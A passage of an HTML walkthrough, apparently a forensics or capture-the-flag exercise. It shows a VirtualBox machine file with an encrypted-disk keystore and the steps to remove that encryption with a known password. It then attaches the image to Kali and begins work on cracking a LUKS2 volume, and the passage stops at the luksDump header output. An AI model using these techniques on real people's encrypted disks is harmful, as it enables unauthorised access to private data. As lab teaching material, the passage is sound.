</span></span></span><span style="display:flex;"><span><span style="color:#75715e">** is running, your changes will be overwritten later, without taking effect.
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">** Use VBoxManage or the VirtualBox Manager GUI to make changes.
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">--&gt;</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;VirtualBox</span> <span style="color:#a6e22e">xmlns=</span><span style="color:#e6db74">&#34;http://www.virtualbox.org/&#34;</span> <span style="color:#a6e22e">version=</span><span style="color:#e6db74">&#34;1.16-windows&#34;</span><span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&lt;Machine</span> <span style="color:#a6e22e">uuid=</span><span style="color:#e6db74">&#34;{528b3540-b8be-4677-b43f-7f4969137747}&#34;</span> <span style="color:#a6e22e">name=</span><span style="color:#e6db74">&#34;Moderator 1&#34;</span> <span style="color:#a6e22e">OSType=</span><span style="color:#e6db74">&#34;Ubuntu_64&#34;</span> <span style="color:#a6e22e">snapshotFolder=</span><span style="color:#e6db74">&#34;Snapshots&#34;</span> <span style="color:#a6e22e">lastStateChange=</span><span style="color:#e6db74">&#34;2021-09-15T16:44:57Z&#34;</span><span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;MediaRegistry&gt;</span>
</span></span><span style="display:flex;"><span>      <span style="color:#f92672">&lt;HardDisks&gt;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&lt;HardDisk</span> <span style="color:#a6e22e">uuid=</span><span style="color:#e6db74">&#34;{12b147da-5b2d-471f-9e32-a32b1517ff4b}&#34;</span> <span style="color:#a6e22e">location=</span><span style="color:#e6db74">&#34;[Path To VDI]/2019.vdi&#34;</span> <span style="color:#a6e22e">format=</span><span style="color:#e6db74">&#34;VDI&#34;</span> <span style="color:#a6e22e">type=</span><span style="color:#e6db74">&#34;Normal&#34;</span><span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>          <span style="color:#f92672">&lt;Property</span> <span style="color:#a6e22e">name=</span><span style="color:#e6db74">&#34;CRYPT/KeyId&#34;</span> <span style="color:#a6e22e">value=</span><span style="color:#e6db74">&#34;Moderator 1&#34;</span><span style="color:#f92672">/&gt;</span>
</span></span><span style="display:flex;"><span>          <span style="color:#f92672">&lt;Property</span> <span style="color:#a6e22e">name=</span><span style="color:#e6db74">&#34;CRYPT/KeyStore&#34;</span> <span style="color:#a6e22e">value=</span><span style="color:#e6db74">&#34;U0NORQABQUVTLVhUUzI1Ni1QTEFJTjY0AAAAAAAAAAAAAAAAAABQQktERjItU0hB&amp;#13;&amp;#10;MjU2AAAAAAAAAAAAAAAAAAAAAAAAAEAAAABUQgV7yASjqRRgfezqVXSqcDjNzg1J&amp;#13;&amp;#10;jH/ENK/ozVskTyAAAADpYIvN2MBwhohZoxyfHl5d6YterYwh8lwMQ+5peBbjLCBO&amp;#13;&amp;#10;AABUYpGmB0lDsJbqgNsq451Bed5tHD8X6iXWLmJ6v6f7y2A9CABAAAAAo4alQy6T&amp;#13;&amp;#10;jyDI+8mvRgp4wXkMGavRxR6cC+ckk5yUgVhhgPxKNBNdhIHkNtjBMrj0uaVQ3ksk&amp;#13;&amp;#10;gwC6MrGLZFhl1g==&#34;</span><span style="color:#f92672">/&gt;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&lt;/HardDisk&gt;</span>
</span></span><span style="display:flex;"><span>      <span style="color:#f92672">&lt;/HardDisks&gt;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;/MediaRegistry&gt;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;ExtraData&gt;</span>
</span></span><span style="display:flex;"><span>      <span style="color:#f92672">&lt;ExtraDataItem</span> <span style="color:#a6e22e">name=</span><span style="color:#e6db74">&#34;GUI/Fullscreen&#34;</span> <span style="color:#a6e22e">value=</span><span style="color:#e6db74">&#34;true&#34;</span><span style="color:#f92672">/&gt;</span>
</span></span><span style="display:flex;"><span>      <span style="color:#f92672">&lt;ExtraDataItem</span> <span style="color:#a6e22e">name=</span><span style="color:#e6db74">&#34;GUI/LastCloseAction&#34;</span> <span style="color:#a6e22e">value=</span><span style="color:#e6db74">&#34;PowerOff&#34;</span><span style="color:#f92672">/&gt;</span>
</span></span><span style="display:flex;"><span>      <span style="color:#f92672">&lt;ExtraDataItem</span> <span style="color:#a6e22e">name=</span><span style="color:#e6db74">&#34;GUI/LastGuestSizeHint&#34;</span> <span style="color:#a6e22e">value=</span><span style="color:#e6db74">&#34;2560,1335&#34;</span><span style="color:#f92672">/&gt;</span>
</span></span><span style="display:flex;"><span>      <span style="color:#f92672">&lt;ExtraDataItem</span> <span style="color:#a6e22e">name=</span><span style="color:#e6db74">&#34;GUI/LastNormalWindowPosition&#34;</span> <span style="color:#a6e22e">value=</span><span style="color:#e6db74">&#34;0,23,2560,1377,max&#34;</span><span style="color:#f92672">/&gt;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;/ExtraData&gt;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;Hardware&gt;</span>
</span></span><span style="display:flex;"><span>      <span style="color:#f92672">&lt;CPU</span> <span style="color:#a6e22e">count=</span><span style="color:#e6db74">&#34;5&#34;</span><span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&lt;PAE</span> <span style="color:#a6e22e">enabled=</span><span style="color:#e6db74">&#34;false&#34;</span><span style="color:#f92672">/&gt;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&lt;LongMode</span> <span style="color:#a6e22e">enabled=</span><span style="color:#e6db74">&#34;true&#34;</span><span style="color:#f92672">/&gt;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&lt;X2APIC</span> <span style="color:#a6e22e">enabled=</span><span style="color:#e6db74">&#34;true&#34;</span><span style="color:#f92672">/&gt;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&lt;HardwareVirtExLargePages</span> <span style="color:#a6e22e">enabled=</span><span style="color:#e6db74">&#34;true&#34;</span><span style="color:#f92672">/&gt;</span>
</span></span><span style="display:flex;"><span>      <span style="color:#f92672">&lt;/CPU&gt;</span>
</span></span><span style="display:flex;"><span>      <span style="color:#f92672">&lt;Memory</span> <span style="color:#a6e22e">RAMSize=</span><span style="color:#e6db74">&#34;6025&#34;</span><span style="color:#f92672">/&gt;</span>
</span></span><span style="display:flex;"><span>      <span style="color:#f92672">&lt;HID</span> <span style="color:#a6e22e">Pointing=</span><span style="color:#e6db74">&#34;USBTablet&#34;</span><span style="color:#f92672">/&gt;</span>
</span></span><span style="display:flex;"><span>      <span style="color:#f92672">&lt;Boot&gt;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&lt;Order</span> <span style="color:#a6e22e">position=</span><span style="color:#e6db74">&#34;1&#34;</span> <span style="color:#a6e22e">device=</span><span style="color:#e6db74">&#34;Floppy&#34;</span><span style="color:#f92672">/&gt;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&lt;Order</span> <span style="color:#a6e22e">position=</span><span style="color:#e6db74">&#34;2&#34;</span> <span style="color:#a6e22e">device=</span><span style="color:#e6db74">&#34;HardDisk&#34;</span><span style="color:#f92672">/&gt;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&lt;Order</span> <span style="color:#a6e22e">position=</span><span style="color:#e6db74">&#34;3&#34;</span> <span style="color:#a6e22e">device=</span><span style="color:#e6db74">&#34;DVD&#34;</span><span style="color:#f92672">/&gt;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&lt;Order</span> <span style="color:#a6e22e">position=</span><span style="color:#e6db74">&#34;4&#34;</span> <span style="color:#a6e22e">device=</span><span style="color:#e6db74">&#34;None&#34;</span><span style="color:#f92672">/&gt;</span>
</span></span><span style="display:flex;"><span>      <span style="color:#f92672">&lt;/Boot&gt;</span>
</span></span><span style="display:flex;"><span>      <span style="color:#f92672">&lt;Display</span> <span style="color:#a6e22e">controller=</span><span style="color:#e6db74">&#34;VMSVGA&#34;</span> <span style="color:#a6e22e">VRAMSize=</span><span style="color:#e6db74">&#34;128&#34;</span> <span style="color:#a6e22e">accelerate3D=</span><span style="color:#e6db74">&#34;true&#34;</span><span style="color:#f92672">/&gt;</span>
</span></span><span style="display:flex;"><span>      <span style="color:#f92672">&lt;VideoCapture</span> <span style="color:#a6e22e">screens=</span><span style="color:#e6db74">&#34;1&#34;</span> <span style="color:#a6e22e">file=</span><span style="color:#e6db74">&#34;.&#34;</span> <span style="color:#a6e22e">fps=</span><span style="color:#e6db74">&#34;25&#34;</span><span style="color:#f92672">/&gt;</span>
</span></span><span style="display:flex;"><span>      <span style="color:#f92672">&lt;BIOS&gt;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&lt;IOAPIC</span> <span style="color:#a6e22e">enabled=</span><span style="color:#e6db74">&#34;true&#34;</span><span style="color:#f92672">/&gt;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&lt;SmbiosUuidLittleEndian</span> <span style="color:#a6e22e">enabled=</span><span style="color:#e6db74">&#34;true&#34;</span><span style="color:#f92672">/&gt;</span>
</span></span><span style="display:flex;"><span>      <span style="color:#f92672">&lt;/BIOS&gt;</span>
</span></span><span style="display:flex;"><span>      <span style="color:#f92672">&lt;USB&gt;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&lt;Controllers&gt;</span>
</span></span><span style="display:flex;"><span>          <span style="color:#f92672">&lt;Controller</span> <span style="color:#a6e22e">name=</span><span style="color:#e6db74">&#34;OHCI&#34;</span> <span style="color:#a6e22e">type=</span><span style="color:#e6db74">&#34;OHCI&#34;</span><span style="color:#f92672">/&gt;</span>
</span></span><span style="display:flex;"><span>          <span style="color:#f92672">&lt;Controller</span> <span style="color:#a6e22e">name=</span><span style="color:#e6db74">&#34;EHCI&#34;</span> <span style="color:#a6e22e">type=</span><span style="color:#e6db74">&#34;EHCI&#34;</span><span style="color:#f92672">/&gt;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&lt;/Controllers&gt;</span>
</span></span><span style="display:flex;"><span>      <span style="color:#f92672">&lt;/USB&gt;</span>
</span></span><span style="display:flex;"><span>      <span style="color:#f92672">&lt;Network&gt;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&lt;Adapter</span> <span style="color:#a6e22e">slot=</span><span style="color:#e6db74">&#34;0&#34;</span> <span style="color:#a6e22e">enabled=</span><span style="color:#e6db74">&#34;true&#34;</span> <span style="color:#a6e22e">MACAddress=</span><span style="color:#e6db74">&#34;08002799F7EC&#34;</span> <span style="color:#a6e22e">type=</span><span style="color:#e6db74">&#34;82540EM&#34;</span><span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>          <span style="color:#f92672">&lt;NAT/&gt;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&lt;/Adapter&gt;</span>
</span></span><span style="display:flex;"><span>      <span style="color:#f92672">&lt;/Network&gt;</span>
</span></span><span style="display:flex;"><span>      <span style="color:#f92672">&lt;AudioAdapter</span> <span style="color:#a6e22e">codec=</span><span style="color:#e6db74">&#34;AD1980&#34;</span> <span style="color:#a6e22e">driver=</span><span style="color:#e6db74">&#34;DirectSound&#34;</span> <span style="color:#a6e22e">enabled=</span><span style="color:#e6db74">&#34;true&#34;</span> <span style="color:#a6e22e">enabledIn=</span><span style="color:#e6db74">&#34;false&#34;</span><span style="color:#f92672">/&gt;</span>
</span></span><span style="display:flex;"><span>      <span style="color:#f92672">&lt;RTC</span> <span style="color:#a6e22e">localOrUTC=</span><span style="color:#e6db74">&#34;UTC&#34;</span><span style="color:#f92672">/&gt;</span>
</span></span><span style="display:flex;"><span>      <span style="color:#f92672">&lt;Clipboard/&gt;</span>
</span></span><span style="display:flex;"><span>      <span style="color:#f92672">&lt;GuestProperties&gt;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&lt;GuestProperty</span> <span style="color:#a6e22e">name=</span><span style="color:#e6db74">&#34;/VirtualBox/GuestAdd/HostVerLastChecked&#34;</span> <span style="color:#a6e22e">value=</span><span style="color:#e6db74">&#34;6.1.34&#34;</span> <span style="color:#a6e22e">timestamp=</span><span style="color:#e6db74">&#34;1657117437893678100&#34;</span> <span style="color:#a6e22e">flags=</span><span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">/&gt;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&lt;GuestProperty</span> <span style="color:#a6e22e">name=</span><span style="color:#e6db74">&#34;/VirtualBox/GuestAdd/Revision&#34;</span> <span style="color:#a6e22e">value=</span><span style="color:#e6db74">&#34;150636&#34;</span> <span style="color:#a6e22e">timestamp=</span><span style="color:#e6db74">&#34;1657117380950198406&#34;</span> <span style="color:#a6e22e">flags=</span><span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">/&gt;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&lt;GuestProperty</span> <span style="color:#a6e22e">name=</span><span style="color:#e6db74">&#34;/VirtualBox/GuestAdd/Version&#34;</span> <span style="color:#a6e22e">value=</span><span style="color:#e6db74">&#34;6.1.34&#34;</span> <span style="color:#a6e22e">timestamp=</span><span style="color:#e6db74">&#34;1657117380950198404&#34;</span> <span style="color:#a6e22e">flags=</span><span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">/&gt;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&lt;GuestProperty</span> <span style="color:#a6e22e">name=</span><span style="color:#e6db74">&#34;/VirtualBox/GuestAdd/VersionExt&#34;</span> <span style="color:#a6e22e">value=</span><span style="color:#e6db74">&#34;6.1.34&#34;</span> <span style="color:#a6e22e">timestamp=</span><span style="color:#e6db74">&#34;1657117380950198405&#34;</span> <span style="color:#a6e22e">flags=</span><span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">/&gt;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&lt;GuestProperty</span> <span style="color:#a6e22e">name=</span><span style="color:#e6db74">&#34;/VirtualBox/GuestInfo/Net/0/MAC&#34;</span> <span style="color:#a6e22e">value=</span><span style="color:#e6db74">&#34;08002799F7EC&#34;</span> <span style="color:#a6e22e">timestamp=</span><span style="color:#e6db74">&#34;1657117380952151105&#34;</span> <span style="color:#a6e22e">flags=</span><span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">/&gt;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&lt;GuestProperty</span> <span style="color:#a6e22e">name=</span><span style="color:#e6db74">&#34;/VirtualBox/GuestInfo/Net/0/Name&#34;</span> <span style="color:#a6e22e">value=</span><span style="color:#e6db74">&#34;enp0s3&#34;</span> <span style="color:#a6e22e">timestamp=</span><span style="color:#e6db74">&#34;1657117380952151107&#34;</span> <span style="color:#a6e22e">flags=</span><span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">/&gt;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&lt;GuestProperty</span> <span style="color:#a6e22e">name=</span><span style="color:#e6db74">&#34;/VirtualBox/GuestInfo/Net/0/Status&#34;</span> <span style="color:#a6e22e">value=</span><span style="color:#e6db74">&#34;Up&#34;</span> <span style="color:#a6e22e">timestamp=</span><span style="color:#e6db74">&#34;1657117380952151106&#34;</span> <span style="color:#a6e22e">flags=</span><span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">/&gt;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&lt;GuestProperty</span> <span style="color:#a6e22e">name=</span><span style="color:#e6db74">&#34;/VirtualBox/GuestInfo/Net/0/V4/Broadcast&#34;</span> <span style="color:#a6e22e">value=</span><span style="color:#e6db74">&#34;10.0.2.255&#34;</span> <span style="color:#a6e22e">timestamp=</span><span style="color:#e6db74">&#34;1657117380952151103&#34;</span> <span style="color:#a6e22e">flags=</span><span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">/&gt;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&lt;GuestProperty</span> <span style="color:#a6e22e">name=</span><span style="color:#e6db74">&#34;/VirtualBox/GuestInfo/Net/0/V4/IP&#34;</span> <span style="color:#a6e22e">value=</span><span style="color:#e6db74">&#34;10.0.2.15&#34;</span> <span style="color:#a6e22e">timestamp=</span><span style="color:#e6db74">&#34;1657117380952151102&#34;</span> <span style="color:#a6e22e">flags=</span><span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">/&gt;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&lt;GuestProperty</span> <span style="color:#a6e22e">name=</span><span style="color:#e6db74">&#34;/VirtualBox/GuestInfo/Net/0/V4/Netmask&#34;</span> <span style="color:#a6e22e">value=</span><span style="color:#e6db74">&#34;255.255.255.0&#34;</span> <span style="color:#a6e22e">timestamp=</span><span style="color:#e6db74">&#34;1657117380952151104&#34;</span> <span style="color:#a6e22e">flags=</span><span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">/&gt;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&lt;GuestProperty</span> <span style="color:#a6e22e">name=</span><span style="color:#e6db74">&#34;/VirtualBox/GuestInfo/Net/Count&#34;</span> <span style="color:#a6e22e">value=</span><span style="color:#e6db74">&#34;1&#34;</span> <span style="color:#a6e22e">timestamp=</span><span style="color:#e6db74">&#34;1657117646084736900&#34;</span> <span style="color:#a6e22e">flags=</span><span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">/&gt;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&lt;GuestProperty</span> <span style="color:#a6e22e">name=</span><span style="color:#e6db74">&#34;/VirtualBox/GuestInfo/OS/Product&#34;</span> <span style="color:#a6e22e">value=</span><span style="color:#e6db74">&#34;Linux&#34;</span> <span style="color:#a6e22e">timestamp=</span><span style="color:#e6db74">&#34;1657117380950198400&#34;</span> <span style="color:#a6e22e">flags=</span><span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">/&gt;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&lt;GuestProperty</span> <span style="color:#a6e22e">name=</span><span style="color:#e6db74">&#34;/VirtualBox/GuestInfo/OS/Release&#34;</span> <span style="color:#a6e22e">value=</span><span style="color:#e6db74">&#34;5.15.0-40-generic&#34;</span> <span style="color:#a6e22e">timestamp=</span><span style="color:#e6db74">&#34;1657117380950198401&#34;</span> <span style="color:#a6e22e">flags=</span><span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">/&gt;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&lt;GuestProperty</span> <span style="color:#a6e22e">name=</span><span style="color:#e6db74">&#34;/VirtualBox/GuestInfo/OS/Version&#34;</span> <span style="color:#a6e22e">value=</span><span style="color:#e6db74">&#34;#43-Ubuntu SMP Wed Jun 15 12:54:21 UTC 2022&#34;</span> <span style="color:#a6e22e">timestamp=</span><span style="color:#e6db74">&#34;1657117380950198402&#34;</span> <span style="color:#a6e22e">flags=</span><span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">/&gt;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&lt;GuestProperty</span> <span style="color:#a6e22e">name=</span><span style="color:#e6db74">&#34;/VirtualBox/HostInfo/DekMissing&#34;</span> <span style="color:#a6e22e">value=</span><span style="color:#e6db74">&#34;1&#34;</span> <span style="color:#a6e22e">timestamp=</span><span style="color:#e6db74">&#34;1657283915359907501&#34;</span> <span style="color:#a6e22e">flags=</span><span style="color:#e6db74">&#34;RDONLYGUEST&#34;</span><span style="color:#f92672">/&gt;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&lt;GuestProperty</span> <span style="color:#a6e22e">name=</span><span style="color:#e6db74">&#34;/VirtualBox/HostInfo/GUI/LanguageID&#34;</span> <span style="color:#a6e22e">value=</span><span style="color:#e6db74">&#34;en_US&#34;</span> <span style="color:#a6e22e">timestamp=</span><span style="color:#e6db74">&#34;1657284945611553900&#34;</span> <span style="color:#a6e22e">flags=</span><span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">/&gt;</span>
</span></span><span style="display:flex;"><span>      <span style="color:#f92672">&lt;/GuestProperties&gt;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;/Hardware&gt;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;StorageControllers&gt;</span>
</span></span><span style="display:flex;"><span>      <span style="color:#f92672">&lt;StorageController</span> <span style="color:#a6e22e">name=</span><span style="color:#e6db74">&#34;AHCI&#34;</span> <span style="color:#a6e22e">type=</span><span style="color:#e6db74">&#34;AHCI&#34;</span> <span style="color:#a6e22e">PortCount=</span><span style="color:#e6db74">&#34;3&#34;</span> <span style="color:#a6e22e">useHostIOCache=</span><span style="color:#e6db74">&#34;false&#34;</span> <span style="color:#a6e22e">Bootable=</span><span style="color:#e6db74">&#34;true&#34;</span> <span style="color:#a6e22e">IDE0MasterEmulationPort=</span><span style="color:#e6db74">&#34;0&#34;</span> <span style="color:#a6e22e">IDE0SlaveEmulationPort=</span><span style="color:#e6db74">&#34;1&#34;</span> <span style="color:#a6e22e">IDE1MasterEmulationPort=</span><span style="color:#e6db74">&#34;2&#34;</span> <span style="color:#a6e22e">IDE1SlaveEmulationPort=</span><span style="color:#e6db74">&#34;3&#34;</span><span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&lt;AttachedDevice</span> <span style="color:#a6e22e">type=</span><span style="color:#e6db74">&#34;HardDisk&#34;</span> <span style="color:#a6e22e">hotpluggable=</span><span style="color:#e6db74">&#34;false&#34;</span> <span style="color:#a6e22e">port=</span><span style="color:#e6db74">&#34;1&#34;</span> <span style="color:#a6e22e">device=</span><span style="color:#e6db74">&#34;0&#34;</span><span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>          <span style="color:#f92672">&lt;Image</span> <span style="color:#a6e22e">uuid=</span><span style="color:#e6db74">&#34;{12b147da-5b2d-471f-9e32-a32b1517ff4b}&#34;</span><span style="color:#f92672">/&gt;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&lt;/AttachedDevice&gt;</span>
</span></span><span style="display:flex;"><span>      <span style="color:#f92672">&lt;/StorageController&gt;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;/StorageControllers&gt;</span>
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&lt;/Machine&gt;</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;/VirtualBox&gt;</span>
</span></span></code></pre></div></li>
<li>
<p>You might need to install the extension pack from <em>

<a href="https://www.virtualbox.org/wiki/Download_Old_Builds_6_1" target="_blank">https://www.virtualbox.org/wiki/Download_Old_Builds_6_1</a></em> or any other source, to be able to decrypt the <em>.vdi</em> file.</p>
</li>
</ul>
<p>Then I can simply <em>double click</em> the file or choose <em>open with VirtualBox</em>:</p>
<p><img src="opening_vdi.png" alt="Opening VDI File"></p>
<p>Now, I need to head to <em>Moderator 1 -&gt; Settings -&gt; General -&gt; Disk Encryption</em> and uncheck enable disk encryption and then click <em>OK</em>.</p>
<p><img src="disabling_encryption.png" alt="Disabling Encryption"></p>
<p>It will prompt me to enter the password, so I&rsquo;ll enter <em>computer</em> and hit <em>OK</em>:</p>
<p><img src="entering_password.png" alt="Entering Password"></p>
<p>After that, the <em>.vdi</em> image should be decrypted and I can attach it to kali.</p>
<p>So, I need to head to <em>Tools</em> and press on <em>Add</em> button and select <em>2019.vdi</em> (by navigating to its location).</p>
<p><img src="adding_vdi.png" alt="Adding VDI"></p>
<p><img src="selecting_vdi_to_add.png" alt="Selecting VDI To Add"></p>
<p>After that, I will attach this file to my kali. I need to head to <em>Kali VM-&gt; Settings -&gt; Storage</em> then press on <em>Add hard disk</em> under the <em>Controller: SATA</em> entry and choose <em>2019.vdi</em> that I just added.</p>
<p><img src="virtual_box_kali_settings.png" alt="Virtual Box Kali&amp;rsquo;s Settings"></p>
<p><img src="attaching_vdi.png" alt="Attaching VDI File"></p>
<p>Once I click <em>OK</em> and boot my machine, I can see that the file has been mounted:</p>
<p><img src="seeing_encrypted_file.png" alt="Discovering The File Is Encrypted"></p>
<h3 id="cracking-luks2-encryption">Cracking LUKS2 Encryption</h3>
<p>However, the file appears to be encrypted again, so I need to know what type of encryption to see if I can crack it, I&rsquo;ll use <code>blkid</code> command:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ sudo blkid
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>/dev/sdb: UUID<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;b41603a3-442c-45a1-a71a-a93ff87e4a43&#34;</span> TYPE<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;crypto_LUKS&#34;</span>
</span></span><span style="display:flex;"><span>/dev/sda5: UUID<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;6cfec41f-5585-48d3-a541-a78af63ba15a&#34;</span> TYPE<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;swap&#34;</span> PARTUUID<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;5bb6cb92-05&#34;</span>
</span></span><span style="display:flex;"><span>/dev/sda1: UUID<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;bc3a4179-0361-4041-a09e-f543948513e9&#34;</span> BLOCK_SIZE<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;4096&#34;</span> TYPE<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;ext4&#34;</span> PTTYPE<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;dos&#34;</span> PARTUUID<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;5bb6cb92-01&#34;</span>
</span></span></code></pre></div><p>The <em>.vdi</em> file is <em>/dev/sdb</em> which appears to be encrypted using 

<a href="https://en.wikipedia.org/wiki/Linux_Unified_Key_Setup" target="_blank"><em>LUKS</em></a>.</p>
<p>To get more information about which type of 

<a href="https://en.wikipedia.org/wiki/Linux_Unified_Key_Setup" target="_blank"><em>LUKS</em></a> encryption is used, I&rsquo;ll use <code>cryptsetup</code> command:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ sudo cryptsetup luksDump /dev/sdb
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>LUKS header information
</span></span><span style="display:flex;"><span>Version:       	<span style="color:#ae81ff">2</span>
</span></span><span style="display:flex;"><span>Epoch:         	<span style="color:#ae81ff">7</span>
</span></span><span style="display:flex;"><span>Metadata area: 	<span style="color:#ae81ff">16384</span> <span style="color:#f92672">[</span>bytes<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>Keyslots area: 	<span style="color:#ae81ff">16744448</span> <span style="color:#f92672">[</span>bytes<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>UUID:          	b41603a3-442c-45a1-a71a-a93ff87e4a43
</span></span><span style="display:flex;"><span>Label:         	<span style="color:#f92672">(</span>no label<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>Subsystem:     	<span style="color:#f92672">(</span>no subsystem<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>Flags:       	<span style="color:#f92672">(</span>no flags<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Data segments:
</span></span><span style="display:flex;"><span>  0: crypt
</span></span><span style="display:flex;"><span>	offset: <span style="color:#ae81ff">16777216</span> <span style="color:#f92672">[</span>bytes<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>	length: <span style="color:#f92672">(</span>whole device<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>	cipher: aes-xts-plain64
</span></span><span style="display:flex;"><span>	sector: <span style="color:#ae81ff">512</span> <span style="color:#f92672">[</span>bytes<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Keyslots:
</span></span><span style="display:flex;"><span>  0: luks2
</span></span><span style="display:flex;"><span>	Key:        <span style="color:#ae81ff">512</span> bits
</span></span><span style="display:flex;"><span>	Priority:   normal
</span></span><span style="display:flex;"><span>	Cipher:     aes-xts-plain64
</span></span><span style="display:flex;"><span>	Cipher key: <span style="color:#ae81ff">512</span> bits
</span></span><span style="display:flex;"><span>	PBKDF:      argon2id
</span></span><span style="display:flex;"><span>	Time cost:  <span style="color:#ae81ff">8</span>
</span></span><span style="display:flex;"><span>	Memory:     <span style="color:#ae81ff">1048576</span>
</span></span><span style="display:flex;"><span>	Threads:    <span style="color:#ae81ff">4</span>
</span></span><span style="display:flex;"><span>	Salt:       c9 <span style="color:#ae81ff">06</span> <span style="color:#ae81ff">76</span> de 9f <span style="color:#ae81ff">07</span> <span style="color:#ae81ff">13</span> <span style="color:#ae81ff">28</span> <span style="color:#ae81ff">04</span> cc d1 fe <span style="color:#ae81ff">41</span> <span style="color:#ae81ff">47</span> dd <span style="color:#ae81ff">63</span> 
</span></span><span style="display:flex;"><span>	           fd 6d 0c 7e ac 8b 1d d8 4b <span style="color:#ae81ff">48</span> 1d <span style="color:#ae81ff">59</span> 3a 7f 6b <span style="color:#ae81ff">48</span> 
</span></span><span style="display:flex;"><span>	AF stripes: <span style="color:#ae81ff">4000</span>
</span></span><span style="display:flex;"><span>	AF hash:    sha256
